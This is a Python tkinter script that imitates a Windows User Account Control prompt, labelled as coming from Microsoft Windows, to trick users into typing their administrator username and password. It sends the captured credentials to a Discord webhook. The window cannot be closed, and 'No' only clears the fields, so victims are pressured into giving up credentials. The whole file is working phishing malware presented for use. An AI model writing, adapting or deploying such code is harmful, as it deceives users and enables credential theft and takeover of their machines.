import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import requests

# Variable global para almacenar el texto introducido
ghx35 = None

# URL del webhook de Discord
DISCORD_WEBHOOK_URL = "webhook here"

def send_to_discord(message):
    try:
        data = {"content": message}
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except:
        pass

def login():
    global ghx35
    username = entry_username.get()
    password = entry_password.get()
    # Verificar que no sean los placeholders y que tengan contenido
    if (username and password and 
        username != "User name" and password != "Password"):
        ghx35 = f"Usuario: {username}, Contraseña: {password}"
        send_to_discord(ghx35)
        root.destroy()
    else:
        pass

def cancel():
    # No cerrar la ventana, solo limpiar los campos
    entry_username.delete(0, tk.END)
    entry_username.insert(0, "User name")
    entry_username.config(fg="gray")
    entry_password.delete(0, tk.END)
    entry_password.insert(0, "Password")
    entry_password.config(fg="gray", show="")

# Crear la ventana principal
root = tk.Tk()
root.title("Windows (cmd subproces) Control")
root.geometry("600x500")
root.resizable(False, False)

# Deshabilitar el botón de cerrar (X) de la ventana
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Configurar colores
color_header = "#6FB1E3"
color_body = "#F0F0F0"
color_blue_dark = "#2B5B7F"

# Frame superior (header azul)
header_frame = tk.Frame(root, bg=color_header, height=120)
header_frame.pack(fill=tk.X)
header_frame.pack_propagate(False)

# Título en el header
title_label = tk.Label(header_frame, text="User Account Control", 
                       bg=color_header, fg="black", 
                       font=("Segoe UI", 11))
title_label.place(x=20, y=15)

# Botón de cerrar (X)
close_button = tk.Button(header_frame, text="✕", 
                         bg=color_header, fg="black",
                         font=("Arial", 14), bd=0,
                         command=cancel, cursor="hand2")
close_button.place(x=565, y=15)

# Pregunta principal
question_label = tk.Label(header_frame, 
                          text="¿Permites que esta aplicación haga cambiso en el equipo?",
                          bg=color_header, fg="black",
                          font=("Segoe UI", 16),
                          justify=tk.LEFT)
question_label.place(x=30, y=50)

# Frame del cuerpo
body_frame = tk.Frame(root, bg=color_body)
body_frame.pack(fill=tk.BOTH, expand=True)

# Icono de la aplicación
try:
    icon_image = Image.open("FakeUAC/cmd.png")
    icon_image = icon_image.resize((40, 40), Image.Resampling.LANCZOS)
    icon_photo = ImageTk.PhotoImage(icon_image)
    icon_label = tk.Label(body_frame, image=icon_photo, bg=color_body)
    icon_label.image = icon_photo
    icon_label.place(x=60, y=30)
except:
    # Si no se encuentra la imagen, usar un frame de color como respaldo
    icon_frame = tk.Frame(body_frame, bg="#5DADE2", width=40, height=40)
    icon_frame.place(x=60, y=30)

app_name_label = tk.Label(body_frame, text="CMD",
                          bg=color_body, fg="black",
                          font=("Segoe UI", 14))
app_name_label.place(x=115, y=38)

# Verified publisher
publisher_label = tk.Label(body_frame, text="Verified publisher: Microsoft Windows",
                           bg=color_body, fg="black",
                           font=("Segoe UI", 9))
publisher_label.place(x=60, y=85)

# Show more details (enlace)
details_link = tk.Label(body_frame, text="Show more details",
                        bg=color_body, fg="#0066CC",
                        font=("Segoe UI", 9, "underline"),
                        cursor="hand2")
details_link.place(x=60, y=115)

# Texto de instrucción
instruction_label = tk.Label(body_frame, 
                             text="Para continuar introduce suario y contraseña adminsitrador.",
                             bg=color_body, fg="black",
                             font=("Segoe UI", 9))
instruction_label.place(x=60, y=150)

# Campo User name
entry_username = tk.Entry(body_frame, font=("Segoe UI", 10), width=45)
entry_username.place(x=60, y=185, height=35)
entry_username.insert(0, "User name")
entry_username.config(fg="gray")

def on_username_focus_in(event):
    if entry_username.get() == "User name":
        entry_username.delete(0, tk.END)
        entry_username.config(fg="black")

def on_username_focus_out(event):
    if entry_username.get() == "":
        entry_username.insert(0, "User name")
        entry_username.config(fg="gray")

entry_username.bind("<FocusIn>", on_username_focus_in)
entry_username.bind("<FocusOut>", on_username_focus_out)

# Campo Password
entry_password = tk.Entry(body_frame, show="●", font=("Segoe UI", 10), width=45)
entry_password.place(x=60, y=235, height=35)
entry_password.insert(0, "Password")
entry_password.config(fg="gray", show="")

def on_password_focus_in(event):
    if entry_password.get() == "Password":
        entry_password.delete(0, tk.END)
        entry_password.config(fg="black", show="●")

def on_password_focus_out(event):
    if entry_password.get() == "":
        entry_password.insert(0, "Password")
        entry_password.config(fg="gray", show="")

entry_password.bind("<FocusIn>", on_password_focus_in)
entry_password.bind("<FocusOut>", on_password_focus_out)

# Domain label
domain_label = tk.Label(body_frame, text="Domain: RUBLON",
                        bg=color_body, fg="black",
                        font=("Segoe UI", 9))
domain_label.place(x=60, y=285)

# Botones Yes y No
button_yes = tk.Button(body_frame, text="Yes", 
                       bg="#D3D3D3", fg="black",
                       font=("Segoe UI", 10),
                       width=22, height=2,
                       relief=tk.RAISED,
                       command=login)
button_yes.place(x=60, y=335)

button_no = tk.Button(body_frame, text="No",
                      bg="#D3D3D3", fg="black",
                      font=("Segoe UI", 10),
                      width=22, height=2,
                      relief=tk.RAISED,
                      command=cancel)
button_no.place(x=325, y=335)

# Ejecutar la aplicación
root.mainloop()

# Después de cerrar la ventana

print(f"Valor final de ghx35: {ghx35}")
